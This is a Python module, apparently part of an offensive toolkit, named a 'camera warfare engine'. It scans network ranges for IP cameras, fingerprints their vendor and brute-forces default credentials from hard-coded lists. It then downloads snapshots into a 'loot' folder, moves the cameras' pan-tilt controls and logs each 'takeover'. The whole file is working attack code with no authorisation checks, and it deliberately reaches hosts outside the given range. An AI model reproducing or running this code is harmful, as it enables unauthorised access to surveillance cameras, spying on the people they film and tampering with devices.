"""quantum.camwar.engine — CAMERA WARFARE ENGINE (V2.2 lineage, V3 carrier)."""
from __future__ import annotations

import ipaddress
import json
import os
import random
import threading
import time

from quantum.camwar.rtsp import rtsp_probe
from quantum.core.deps import HTTPBasicAuth, HTTPDigestAuth, requests
from quantum.core.env import LOOT_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import log
from quantum.core.opsec import tcp_probe
from quantum.recon.wsdiscovery import onvif_device_info, wsdiscovery_cameras


class CamWarEngine:
    CAM_PORTS = [80, 443, 554, 37777, 37778, 8000, 8001, 8080, 8081, 8899,
                 34567, 34571, 34599, 5000]
    VENDOR_HINTS = [
        ("hikvision", ("hikvision", "webcomponents", "doc/page/login", "www-uc",
                       "embedded_net_dvr", "netdvr", "hik-")),
        ("dahua",     ("dahua", "login_module.js", "netkeyboard", "dvrdvs", "dss")),
        ("axis",      ("axis", "axis-cgi")),
        ("foscam",    ("foscam", "cgi-bin/hi3510", "get_params.cgi", "ipcam")),
        ("tplink",    ("tapo", "tplink")),
        ("generic",   ("ipcamera", "netcam", "webcam", "rtsp")),
    ]
    RTSP_VENDORS = [
        ("hikvision", ("embedded_net_dvr", "netdvr", "hikvision", "hik-")),
        ("dahua",     ("dahua", "dvrdvs", "dss")),
        ("vivotek",   ("vivotek",)),
        ("axis",      ("axis",)),
        ("foscam",    ("ipcamera", "foscam")),
        ("tplink",    ("tapo",)),
    ]
    CREDS = {
        "hikvision": [("admin", "admin"), ("admin", "12345"), ("admin", "888888"),
                     ("admin", "66668888"), ("admin", "Admin123"), ("admin", "")],
        "dahua":     [("admin", "admin"), ("admin", "admin1234"), ("888888", "888888"), ("admin", "123456")],
        "axis":      [("root", "pass"), ("root", "root"), ("admin", "1234"), ("admin", "admin")],
        "foscam":    [("admin", ""), ("admin", "admin"), ("admin", "12345"), ("admin", "888888")],
        "tplink":    [("admin", "admin"), ("admin", "password")],
        "generic":   [("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"),
                      ("user", "user"), ("guest", "guest"), ("888888", "888888")],
    }
    INFO_ENDPOINTS = {
        "hikvision": ("/ISAPI/System/deviceInfo", "digest"),
        "dahua":     ("/cgi-bin/magicBox.cgi?action=getSystemInfo", "digest"),
        "axis":      ("/axis-cgi/param.cgi?action=list", "basic"),
        "foscam":    ("/get_params.cgi", "basic"),
        "generic":    ("/", "basic"),
    }
    SNAPSHOT = {
        "hikvision": [("/ISAPI/Streaming/channels/101/picture", "digest"),
                      ("/ISAPI/Streaming/channels/1/picture", "digest"),
                      ("/ISAPI/System/Video/inputs/channels/1/picture", "digest")],
        "dahua":     [("/cgi-bin/snapshot.cgi", "digest"),
                      ("/cgi-bin/snapshot.cgi?channel=1", "digest")],
        "axis":      [("/axis-cgi/jpg/image.cgi?resolution=640x480", "basic")],
        "foscam":    [("/snapshot.cgi", "basic")],
        "generic":   [],
    }
    GENERIC_SNAPSHOTS = [
        ("/snapshot.cgi", "basic"), ("/image.jpg", "basic"),
        ("/snap.jpg", "basic"), ("/snapshot.jpg", "basic"),
        ("/onvif-http/snapshot.jpg", "basic"),
        ("/cgi-bin/snapshot.cgi", "digest"),
        ("/ISAPI/Streaming/channels/101/picture", "digest"),
        ("/tmpfs/snap.jpg", "basic"),
        ("/webcapture.jpg?command=snap&channel=1", "basic"),
    ]
    PTZ = {
        "hikvision": ("put", "/ISAPI/PTZCtrl/channels/1/continuous",
                      '<PTZData><pan>60</pan><tilt>0</tilt></PTZData>', "digest"),
        "dahua":     ("get", "/cgi-bin/ptz.cgi?action=start&code=LeftRight&arg1=1&arg2=1&channel=1", None, "digest"),
        "axis":      ("get", "/axis-cgi/com/ptz.cgi?move=up", None, "basic"),
        "foscam":    ("get", "/decoder_control.cgi?command=2", None, "basic"),
    }

    @classmethod
    def _auth(cls, kind, u, p):
        return HTTPDigestAuth(u, p) if kind == "digest" else HTTPBasicAuth(u, p)

    @staticmethod
    def _rtsp_probe(ip, port=554, timeout=3):
        return rtsp_probe(ip, port, timeout)

    @classmethod
    def _rtsp_alive(cls, ip, port=554, timeout=3):
        return "RTSP" in cls._rtsp_probe(ip, port, timeout)

    @classmethod
    def _vendor_from_rtsp(cls, raw):
        low = raw.lower()
        for vendor, hints in cls.RTSP_VENDORS:
            if any(h in low for h in hints):
                return vendor
        return None

    @staticmethod
    def _vendor_from_str(s):
        low = (s or "").lower()
        if "hik" in low: return "hikvision"
        if "dahua" in low: return "dahua"
        if "axis" in low: return "axis"
        if "foscam" in low: return "foscam"
        if "tapo" in low or "tplink" in low: return "tplink"
        return None

    def identify(self, ip):
        info = {"ip": ip, "vendor": None, "rtsp": False, "ports": []}
        vol = None
        for port in self.CAM_PORTS:
            if tcp_probe(ip, port, timeout=0.8):
                info["ports"].append(port)
                if port in (80, 8080, 8000, 8081, 443, 5000) and vol is None:
                    try:
                        scheme = "https" if port == 443 else "http"
                        r = requests.get(f"{scheme}://{ip}:{port}", timeout=3, verify=False)
                        hay = (r.text or "").lower() + " " + (
                            r.headers.get("Server", "") + " " + r.headers.get("WWW-Authenticate", "")).lower()
                        if not any(h in hay for h in ("embedded_net_dvr", "netdvr")):
                            try:
                                r2 = requests.get(f"{scheme}://{ip}:{port}/doc/page/login.asp",
                                                  timeout=3, verify=False)
                                hay += " " + (r2.text or "").lower()[:4000]
                            except Exception:
                                pass
                        for vendor, hints in self.VENDOR_HINTS:
                            if any(h in hay for h in hints):
                                info["vendor"] = vendor; vol = port; break
                        if port == 443: info["scheme"] = "https"
                    except Exception:
                        pass
        if tcp_probe(ip, 554, timeout=1.0):
            raw = self._rtsp_probe(ip)
            if "RTSP" in raw:
                info["rtsp"] = True
            if info["vendor"] is None:
                got = self._vendor_from_rtsp(raw)
                if got:
                    info["vendor"] = got
                    log(f"CAM WAR: {ip} vendor={got} via RTSP Server header", "CAM")
        if info["vendor"] is None and info["rtsp"]:
            info["vendor"] = "generic"
        return info

    def discover(self, cidr):
        cameras, checked = [], 0
        try:
            hosts = [str(i) for i in ipaddress.ip_network(cidr, strict=False).hosts()]
        except Exception as e:
            log(f"CAMWAR bad CIDR {cidr}: {e}", "ERR"); return []
        log(f"CAM WAR: sweeping {len(hosts)} hosts in {cidr} for cameras (TCP + WS-Discovery)…", "CAM")

        ws = wsdiscovery_cameras(timeout=4.0)
        wsmap = {w["ip"]: w for w in ws}

        def merge_ws(info, w):
            info["onvif"] = True
            if w.get("onvif_port") and w["onvif_port"] not in info["ports"]:
                info["ports"].append(w["onvif_port"])
            if info["vendor"] is None and w.get("manufacturer"):
                info["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
            if w.get("model"): info["model"] = w["model"]
            if w.get("name"): info["name"] = w["name"]
            return info

        lock = threading.Lock()
        def work(ip):
            nonlocal checked
            info = self.identify(ip)
            w = wsmap.get(ip)
            if w:
                info = merge_ws(info, w)
                if info["vendor"] is None and info["rtsp"]:
                    info["vendor"] = "generic"
            with lock:
                checked += 1
                if info["vendor"] or info["rtsp"] or 554 in info["ports"] or w is not None:
                    cameras.append(info)
                    log(f"CAM WAR: camera candidate {ip} vendor={info['vendor']} "
                        f"rtsp={info['rtsp']} ports={info['ports']}"
                        + (f" model={info.get('model')}" if info.get("model") else ""), "CAM")
        with _pool(64) as ex:
            list(ex.map(work, hosts))

        hostset = set(hosts)
        for w in ws:
            if w["ip"] not in hostset:
                info = merge_ws(self.identify(w["ip"]), w)
                if info["vendor"] or info["rtsp"] or 554 in info["ports"]:
                    cameras.append(info)
                    log(f"CAM WAR: (out-of-scope via WS) camera {w['ip']} "
                        f"vendor={info['vendor']} model={info.get('model')}", "CAM")

        for cam in cameras:
            if not (cam.get("model") or cam.get("onvif_port")):
                continue
            for p in (cam.get("onvif_port"), 80, 8000, 8080):
                if p and tcp_probe(cam["ip"], p, timeout=0.8):
                    dbg = onvif_device_info(cam["ip"], p)
                    if dbg: break
        log(f"CAM WAR: discovery done — {checked} hosts checked + {len(ws)} WS-Discovery hits, "
            f"{len(cameras)} cameras found", "CAM")
        return cameras

    def attack_cam(self, cam):
        vendor = cam.get("vendor") or "generic"
        scheme = cam.get("scheme") or ("https" if 443 in cam.get("ports", []) else "http")
        base = f"{scheme}://{cam['ip']}"
        info_path, authkind = self.INFO_ENDPOINTS.get(vendor, self.INFO_ENDPOINTS["generic"])
        for user, pwd in self.CREDS.get(vendor, self.CREDS["generic"]):
            try:
                r = requests.get(base + info_path, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 0:
                    cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
                    log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED with {user}:{pwd or '<blank>'}", "CAM")
                    return (user, pwd)
                for alt in ("/doc/page/login.asp", "/onvif/device_service"):
                    try:
                        r2 = requests.get(base + alt, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
                        if r2.status_code in (200, 400, 405) and user != "guest":
                            cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
                            log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED via {alt} with {user}:{pwd or '<blank>'}", "CAM")
                            return (user, pwd)
                    except Exception:
                        continue
            except Exception:
                continue
        cam["controlled"] = False
        log(f"CAM WAR: {cam['ip']} ({vendor}) resisted default creds", "CAM")
        return None

    def control_cam(self, cam, ptz=True):
        if not cam.get("controlled"): return None
        vendor = cam.get("vendor") or "generic"
        scheme = cam.get("scheme") or "http"
        base = f"{scheme}://{cam['ip']}"
        candidates = list(self.SNAPSHOT.get(vendor, []))
        for v in ("hikvision", "dahua", "axis", "foscam"):
            if v != vendor:
                candidates += self.SNAPSHOT[v]
        candidates += self.GENERIC_SNAPSHOTS
        shots = []
        for path, kind in candidates:
            try:
                r = requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]),
                                 timeout=8, verify=False)
                if r.status_code == 200 and r.content[:2] in (b"\xff\xd8", b"\x89PNG"):
                    fn = os.path.join(LOOT_DIR, f"cam_{cam['ip']}_{int(time.time())}.jpg")
                    open(fn, "wb").write(r.content)
                    sealed = GRAYFISH.seal(fn)
                    shots.append(sealed)
                    log(f"CAM WAR: snapshot exfil {cam['ip']} -> {sealed}", "CAM")
                    break
            except Exception:
                continue
        if ptz and vendor in self.PTZ:
            method, path, body, kind = self.PTZ[vendor]
            try:
                if method == "put":
                    requests.put(base + path, data=body,
                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                    time.sleep(1.0)
                    requests.put(base + path, data='<PTZData><pan>0</pan><tilt>0</tilt></PTZData>',
                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                else:
                    requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
                cam["ptz"] = "nudged"
                log(f"CAM WAR: PTZ nudged on {cam['ip']}", "CAM")
            except Exception as e:
                log(f"CAM WAR: PTZ {cam['ip']}: {e}", "WARN")
        cam["snapshots"] = shots
        return shots

    def one_shot(self, ip, ptz=True):
        cam = self.identify(ip)
        if not cam["vendor"] and not cam["rtsp"]:
            for w in wsdiscovery_cameras(timeout=3.0):
                if w["ip"] == ip:
                    if w.get("manufacturer"):
                        cam["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
                    cam["onvif"] = True
                    break
        if not cam["vendor"] and not cam["rtsp"] and not cam.get("onvif"):
            return {"ip": ip, "camera": False}
        if cam["vendor"] is None: cam["vendor"] = "generic"
        self.attack_cam(cam)
        self.control_cam(cam, ptz=ptz)
        return cam

    def pwn_network(self, cidr, report=True):
        log(f"CAM WAR: ENGAGING full takeover on {cidr}", "CAM")
        cams = self.discover(cidr)
        cracked, snapshots = 0, 0
        for cam in cams:
            if self.attack_cam(cam):
                cracked += 1
                snaps = self.control_cam(cam) or []
                snapshots += len(snaps)
            time.sleep(random.uniform(0.3, 1.5))
        summary = {"cidr": cidr, "found": len(cams), "cracked": cracked,
                   "snapshots": snapshots,
                   "cams": [{"ip": c["ip"], "vendor": c["vendor"], "rtsp": c["rtsp"],
                             "model": c.get("model"), "controlled": c.get("controlled", False)} for c in cams]}
        if report:
            fn = os.path.join(LOOT_DIR, f"camwar_{cidr.replace('/', '_')}_{int(time.time())}.json")
            open(fn, "w").write(json.dumps(summary, indent=2))
            GRAYFISH.seal(fn)
        log(f"CAM WAR: {cidr} dominated — {len(cams)} found, {cracked} cracked, "
            f"{snapshots} snapshots exfiltrated", "CAM")
        return summary


def _pool(n):
    from concurrent.futures import ThreadPoolExecutor
    return ThreadPoolExecutor(max_workers=n)


CAMWAR = CamWarEngine()
